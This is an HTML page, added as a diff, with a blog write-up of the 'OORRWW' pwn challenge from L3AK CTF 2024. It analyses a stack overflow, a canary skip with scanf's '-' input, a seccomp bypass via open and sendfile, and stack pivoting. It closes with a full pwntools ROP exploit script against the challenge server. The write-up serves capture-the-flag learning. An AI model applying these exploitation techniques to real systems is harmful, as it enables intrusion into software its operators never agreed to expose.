@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>L3AK CTF 2024 - OORRWW | F0ndueSav0yarde</title>
+<meta name="title" content="L3AK CTF 2024 - OORRWW" />
+<meta name="description" content="OORRWW" />
+<meta name="author" content="" />
+<meta name="keywords" content="" />
+
+
+
+
+
+
+  
+  <meta property="og:url" content="https://f0nduesav0yarde.github.io/blog/writeups/l3akctf_2024_oorrww/">
+  <meta property="og:site_name" content="F0ndueSav0yarde">
+  <meta property="og:title" content="L3AK CTF 2024 - OORRWW">
+  <meta property="og:description" content="OORRWW">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="L3AK CTF 2024 - OORRWW">
+  <meta name="twitter:description" content="OORRWW">
+
+
+  
+  
+  <meta itemprop="name" content="L3AK CTF 2024 - OORRWW">
+  <meta itemprop="description" content="OORRWW">
+  <meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="wordCount" content="1029">
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/original.min.css" rel="stylesheet">
+
+  
+    
+    <link href="/syntax.min.css" rel="stylesheet">
+  
+
+  
+
+  
+</head>
+
+<body>
+  <header><a class="skip-link" href="#main-content">Skip to main content</a>
+
+<a href="/" class="title"><h1>F0ndueSav0yarde</h1></a>
+<nav>
+
+
+
+
+
+
+
+</nav>
+</header>
+  <main id="main-content">
+
+<h1>L3AK CTF 2024 - OORRWW</h1>
+
+
+<content>
+  <p><strong>Category : PWN</strong></p>
+<h2 id="phreaks-2600">Phreaks 2600</h2>
+<p>You can find this writeup at <a href="https://phreaks2600.fr/blog/l3ak-2025-oorrww/">Phreaks 2600 website</a></p>
+<h2 id="pwninit-and-checksec">Pwninit and checksec</h2>
+<p>The <strong>orrww</strong> binary is given with older version of <strong>libc.so.6</strong>.<br>
+I used <a href="https://github.com/io12/pwninit">pwninit</a> to patch the binary with patchelf to use the correct <strong>RPATH</strong> and linker for the provided libc :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/checksec.png" alt="checksec"></p>
+<p>As you can see, all protection are activated.<br>
+I have no information about <strong>ASLR</strong> so I assume it is enabled on the remote machine.</p>
+<h2 id="decompilation-with-ghidra">Decompilation with Ghidra</h2>
+<p>I decompiled <code>main()</code> function with Ghidra :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/ghidra_decompile_1.png" alt="ghidra_decompile_1"></p>
+<p>The first thing interesting here is <code>sandbox()</code> function :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/ghidra_decompile_2.png" alt="ghidra_decompile_2"></p>
+<p>There is a <code>seccomp</code> sandbox that i need to bypass.</p>
+<h2 id="seccomp-bpf-analysis">Seccomp-BPF analysis</h2>
+<p>It is possible to dump <strong>seccomp-BPF</strong> rules using <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/seccomp.png" alt="seccomp"></p>
+<p><code>execve</code> and <code>execveat</code> syscall are forbidden. There are at least two ways to bypass these rules and read <code>flag.txt</code> file :</p>
+<ul>
+<li><code>open</code> -&gt; <code>read</code> -&gt; <code>puts</code></li>
+<li><code>open</code> -&gt; <code>sendfile</code></li>
+</ul>
+<h2 id="leaks">Leaks</h2>
+<p>The second thing interesting from <code>main()</code> function is <code>gift()</code> function :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/gift.png" alt="gift"></p>
+<p>It leaks the address of <code>__isoc99_scanf()</code> from LIBC and <code>param_1</code>, which is the address of the buffer where data will be written in the stack.<br>
+It will be useful.</p>
+<p>So, where’s the vulnerability ?</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Here, in <code>main()</code> function :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/vuln.png" alt="vuln"></p>
+<p>The program asks the user to write 22 doubles inside a buffer of 152 bytes. However, a double is 8 bytes-long and</p>
+
+
+
+
+
+<pre tabindex="0"><code>buffer + (i &lt;&lt; 3) = buffer + (i * 8)</code></pre><p><code>i</code> variable has a maximum value of 21. It is then possible to write doubles value from <code>buffer[0]</code> to <code>buffer[21]</code> :</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">index</th>
+          <th style="text-align: center">offset</th>
+          <th style="text-align: center">overflow ?</th>
+          <th style="text-align: center">stack</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">buffer[0]</td>
+          <td style="text-align: center">buffer + 0</td>
+          <td style="text-align: center">no</td>
+          <td style="text-align: center">buffer</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">buffer[1]</td>
+          <td style="text-align: center">buffer + 8</td>
+          <td style="text-align: center">no</td>
+          <td style="text-align: center">buffer</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">buffer[2]</td>
+          <td style="text-align: center">buffer + 16</td>
+          <td style="text-align: center">no</td>
+          <td style="text-align: center">buffer</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">…</td>
+          <td style="text-align: center">…</td>
+          <td style="text-align: center">…</td>
+          <td style="text-align: center">…</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">buffer[18]</td>
+          <td style="text-align: center">buffer + 144</td>
+          <td style="text-align: center">no</td>
+          <td style="text-align: center">buffer</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">buffer[19]</td>
+          <td style="text-align: center">buffer + 152</td>
+          <td style="text-align: center">yes</td>
+          <td style="text-align: center">canary</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">buffer[20]</td>
+          <td style="text-align: center">buffer + 160</td>
+          <td style="text-align: center">yes</td>
+          <td style="text-align: center">RBP</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">buffer[21]</td>
+          <td style="text-align: center">buffer + 168</td>
+          <td style="text-align: center">yes</td>
+          <td style="text-align: center">RET</td>
+      </tr>
+  </tbody>
+</table>
+<p>To recap, there is a stack-based buffer overflow where I can rewrite the <strong>canary</strong> value, <strong>RBP</strong> and <strong>RET</strong> value.<br>
+I can only control 176 bytes in the stack (22 floating point values).</p>
+<h2 id="strategy">Strategy</h2>
+<p>I have two leaks : <code>&amp;buffer</code> and <code>__isoc99_scanf@GOT</code>. I can do LIBC leak and use LIBC gadgets to craft my <strong>ROPchain</strong>.</p>
+
+
+
+
+
+<pre tabindex="0"><code>0x0000000000045eb0 : pop rax ; ret
+0x000000000002a3e5 : pop rdi ; ret
+0x000000000002be51 : pop rsi ; ret
+0x00000000000904a9 : pop rdx ; pop rbx ; ret
+0x000000000003d1ee : pop rcx ; ret
+0x0000000000091316 : syscall ; ret</code></pre><p>I can bypass seccomp rules with : <code>open</code> -&gt; <code>sendfile</code></p>
+<p>But how can I bypass the canary value ?<br>
+No leak for this, but It is possible to not overwrite data with “<strong>%lf</strong>” floating point specifier from <code>scanf()</code> using “<strong>-</strong>” character !<br>
+It will do nothing and the execution will continue.</p>
+<p>Here is my final strategy :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww/strategy.png" alt="strategy"></p>
+<ul>
+<li><strong>Step 1</strong> : Write <code>“flag.txt\0”</code> into the stack using the first 16 bytes of the buffer</li>
+<li><strong>Step 2</strong> : Open <code>“flag.txt\0”</code> file with open syscall in reading mode only (<strong>O_RDONLY</strong>). This is here where the payload execution will start after redirecting <strong>RSP</strong> and <strong>RIP</strong></li>
+<li><strong>Step 3</strong> : Craft the <strong>ROPchain</strong> to call <code>open</code> syscall. I assume that the next file descriptor (generated by open) will be 3.</li>
+</ul>
+
+
+
+
+
+<pre tabindex="0"><code>pop rax     ; SYS_OPEN -&gt; 2
+ret
+pop rdi     ; &amp;&#34;flag.txt\0&#34; -&gt; address of buffer leaked by gift()
+ret
+pop rsi     ; O_RDONLY -&gt; 2
+ret
+syscall     ; open(&#34;flag.txt&#34;,O_RDONLY);
+ret</code></pre><ul>
+<li><strong>Step 4</strong> : Craft the <strong>ROPchain</strong> to call sendfile from LIBC.</li>
+<li><strong>Step 5</strong> : Call <code>sendfile()</code> from LIBC to redirect n bytes of content of the opened file from an other file descriptor (stdout is interesting to see the flag and 80 bytes should be enough)</li>
+</ul>
+
+
+
+
+
+<pre tabindex="0"><code>pop rdi         ; 3 (I assume this is the next file descriptor)
+ret
+pop rsi         ; stdout -&gt; 1
+ret
+pop rdx         ; offset = 0
+ret
+pop rbx         ; Gadget I found with RDX -&gt; junk value
+ret
+pop rcx         ; 0x50 -&gt; 80 bytes -&gt; any big value for flag
+ret
+sendfile@LIBC   ; address of sendfile from LIBC (using LIBC leak) 
+                ; sendfile(3,1,0,80);</code></pre><ul>
+<li><strong>Step 6</strong> : Bypass the canary value without overwriting it using “<strong>-</strong>” character.</li>
+<li><strong>Step 7</strong> : Overwrite the value of <strong>RBP</strong> with <code>buffer+8</code> with the help of <code>gift()</code> leak.<br>
+It will redirect <strong>RSP</strong> after pivoting stack to <code>buffer+16</code>, where <code>open</code> syscall parameters are loaded.</li>
+<li><strong>Step 8</strong> : Pivoting the stack with <code>leave ; ret</code> to redirect <strong>RSP</strong> to <code>buffer+16</code> and <strong>RIP</strong> to <strong>RSP</strong>.</li>
+</ul>
+<h2 id="payload">Payload</h2>
+<p>Here is the final payload :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># ===============================================[ Module Imports ]===============================================</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">decimal</span> <span class="kn">import</span> <span class="n">Decimal</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># =====================================[ Load ELF binary and start process ]======================================</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./oorrww_patched&#34;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;193.148.168.30&#34;</span><span class="p">,</span> <span class="mi">7666</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1">#io = process([elf.path],env={&#34;LD_PRELOAD&#34;: libc.path})</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"># ===================================================[ Leaks ]====================================================</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">buffer_leak</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;d&#39;</span><span class="p">,</span><span class="n">Decimal</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">5</span><span class="p">]))</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">scanf_leak</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;d&#39;</span><span class="p">,</span><span class="n">Decimal</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Leak : __isoc99_scanf @ &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">scanf_leak</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])))</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Leak : buffer         @ &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">buffer_leak</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])))</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] LIBC base address     @ &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">scanf_leak</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__isoc99_scanf&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1"># ================================================[ LIBC Gadgets ]================================================</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">scanf_leak</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__isoc99_scanf&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="n">LEAVE_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000004da83</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="n">POP_RAX_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0000000000045eb0</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="n">POP_RDI_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000002a3e5</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="n">POP_RSI_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000002be51</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="n">POP_RDX_POP_RBX_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x00000000000904a9</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="n">POP_RCX_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x000000000003d1ee</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="n">SYSCALL_RET</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0000000000091316</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="c1"># ==================================================[ Functions ]=================================================</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="k">def</span> <span class="nf">int2double</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">
+</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="k">def</span> <span class="nf">double2bytes</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="k">def</span> <span class="nf">int2bytes</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">return</span> <span class="n">double2bytes</span><span class="p">(</span><span class="n">int2double</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl">
+</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">def</span> <span class="nf">bytes2doublebytes</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">return</span> <span class="n">double2bytes</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl">
+</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="c1"># ===================================================[ Payload ]==================================================</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>         <span class="n">bytes2doublebytes</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">),</span> <span class="c1"># &#34;flag.txt&#34;</span>
+</span></span><span class="line"><span class="ln">47</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># &#34;\0&#34; for the end of &#34;flag.txt&#34;</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RAX_RET</span><span class="p">),</span> <span class="c1"># RAX = 2</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># RDI = buffer -&gt; &amp;&#34;flag.txt\0&#34; </span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl">                    <span class="n">bytes2doublebytes</span><span class="p">(</span><span class="n">buffer_leak</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">52</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span> <span class="c1"># RSI = O_RDONLY -&gt; 2</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">54</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">SYSCALL_RET</span><span class="p">),</span> <span class="c1"># open(&#34;flag.txt\0&#34;,O_RDONLY);</span>
+</span></span><span class="line"><span class="ln">55</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># RDI = 1 -&gt; stdout</span>
+</span></span><span class="line"><span class="ln">56</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">57</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span> <span class="c1"># RSI = 3 (I assume it is the file descriptor of opened file)</span>
+</span></span><span class="line"><span class="ln">58</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">59</span><span class="cl">                    <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDX_POP_RBX_RET</span><span class="p">),</span> <span class="c1"># RDX = 0 -&gt; offset</span>
+</span></span><span class="line"><span class="ln">60</span><span class="cl">                                                    <span class="c1"># RBX = 0 (junk)</span>
+</span></span><span class="line"><span class="ln">61</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">62</span><span class="cl">                                        <span class="n">int2bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">63</span><span class="cl">                            <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RCX_RET</span><span class="p">),</span> <span class="c1"># RCX = 0x50 </span>
+</span></span><span class="line"><span class="ln">64</span><span class="cl">                                    <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x50</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">65</span><span class="cl">            <span class="n">int2bytes</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;sendfile&#34;</span><span class="p">]),</span> <span class="c1"># sendfile(1,3,0,0x50);                  </span>
+</span></span><span class="line"><span class="ln">66</span><span class="cl">                                                <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># Canary bypass</span>
+</span></span><span class="line"><span class="ln">67</span><span class="cl">                        <span class="n">int2bytes</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">buffer_leak</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">),</span> <span class="c1"># RBP = (buffer + 8) </span>
+</span></span><span class="line"><span class="ln">68</span><span class="cl">                                <span class="n">int2bytes</span><span class="p">(</span><span class="n">LEAVE_RET</span><span class="p">)</span> <span class="c1"># Stack pivoting : RSP = (buffer + 16) and RIP = RSP</span>
+</span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="ln">70</span><span class="cl">
+</span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="c1"># =====================================================[ Flag ]===================================================</span>
+</span></span><span class="line"><span class="ln">72</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">73</span><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">74</span><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">75</span><span class="cl">
+</span></span><span class="line"><span class="ln">76</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;FLAG : &#34;</span><span class="o">+</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">))</span></span></span></code></pre></div><script>
+
+
+</script>
+
+<script>
+var all_codeblocks = document.getElementsByClassName("chroma")
+for(let i=0;i<all_codeblocks.length;i++)
+{
+    all_lines_of_a_codeblock = all_codeblocks[i].getElementsByClassName("line");
+    let start_number = -1;
+    start_number = parseInt(all_lines_of_a_codeblock[0].getElementsByTagName("span")[2].innerHTML,10);
+    all_lines_of_a_codeblock[0].style.display = "none";    
+    for(let line=1;line<all_lines_of_a_codeblock.length;line++)
+    {
+        let diff = String(all_lines_of_a_codeblock.length).length - String(start_number).length;
+        if(diff > 0)
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = "<span style='visibility:hidden;'>" + "0".repeat(diff) + "</span>" + String(start_number);
+        }
+        else
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number);
+        }
+        start_number = start_number + 1;
+    }
+}
+</script>
+
+</content>
+<p>
+  
+</p>
+
+
+
+
+  </main>
+  <footer></footer>
+
+    
+</body>
+
+</html>
